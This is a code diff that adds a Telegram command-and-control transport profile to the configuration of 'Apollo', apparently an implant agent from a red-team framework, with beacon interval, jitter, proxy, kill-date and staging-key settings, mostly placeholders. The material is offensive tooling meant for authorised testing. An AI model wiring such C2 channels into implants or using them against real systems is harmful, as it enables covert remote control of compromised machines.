@@ -9,6 +9,7 @@
 //#define SMB
 //#define AZURE_BLOB
 //#define HTTPX
+//#define TELEGRAM
 #endif
 
 #if HTTP
@@ -35,6 +36,9 @@ using TcpTransport;
 #endif
 #if AZURE_BLOB
 using AzureBlobTransport;
+#endif
+#if TELEGRAM
+using TelegramTransport;
 #endif
 namespace Apollo
 {
@@ -195,6 +199,49 @@ namespace Apollo
                 }
             },
 #endif
+#if TELEGRAM
+            { "telegram", new C2ProfileData()
+                {
+                    TC2Profile = typeof(TelegramProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if LOCAL_BUILD
+                        { "bot_token", "000000000:local-development-token" },
+                        { "controller_bot", "@controller_bot" },
+                        { "api_base", "https://api.telegram.org" },
+                        { "message_checks", "10" },
+                        { "time_between_checks", "10" },
+                        { "callback_interval", "60" },
+                        { "callback_jitter", "10" },
+                        { "encrypted_exchange_check", "T" },
+                        { "user_agent", "Mozilla/5.0" },
+                        { "proxy_host", "" },
+                        { "proxy_port", "" },
+                        { "proxy_user", "" },
+                        { "proxy_pass", "" },
+                        { "killdate", "-1" },
+#else
+                        { "bot_token", "telegram_bot_token_here" },
+                        { "controller_bot", "telegram_controller_bot_here" },
+                        { "api_base", "telegram_api_base_here" },
+                        { "message_checks", "telegram_message_checks_here" },
+                        { "time_between_checks", "telegram_time_between_checks_here" },
+                        { "callback_interval", "telegram_callback_interval_here" },
+                        { "callback_jitter", "telegram_callback_jitter_here" },
+                        { "encrypted_exchange_check", "telegram_encrypted_exchange_check_here" },
+                        { "user_agent", "telegram_user_agent_here" },
+                        { "proxy_host", "telegram_proxy_host_here" },
+                        { "proxy_port", "telegram_proxy_port_here" },
+                        { "proxy_user", "telegram_proxy_user_here" },
+                        { "proxy_pass", "telegram_proxy_pass_here" },
+                        { "killdate", "telegram_killdate_here" },
+#endif
+                    }
+                }
+            },
+#endif
 #if HTTPX
             { "httpx", new C2ProfileData()
                 {
@@ -247,6 +294,8 @@ namespace Apollo
         public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
   #elif AZURE_BLOB
         public static string StagingRSAPrivateKey = "R3BLdG9OZXdBenVyZUJsb2JQcm9maWxlS2V5MTIzNA==";
+  #elif TELEGRAM
+        public static string StagingRSAPrivateKey = "VGVsZWdyYW1Mb2NhbERldmVsb3BtZW50S2V5MTIzNA==";
   #elif HTTPX
         public static string StagingRSAPrivateKey = "K4FLVfFwCPj3zBC+5l9WLCKqsmrtzkk/E8VcVY6iK/o=";
   #endif
@@ -260,6 +309,8 @@ namespace Apollo
         public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
   #elif AZURE_BLOB
         public static string PayloadUUID = "d1eefaf1-99c7-1901-ded0-3fac2312abdc";
+  #elif TELEGRAM
+        public static string PayloadUUID = "916c50df-f46d-4eb8-b2d5-5ca92ca6893f";
   #elif HTTPX
         public static string PayloadUUID = "7f2a0f77-51ca-4afc-a7a9-5ea9717e73c3";
   #endif
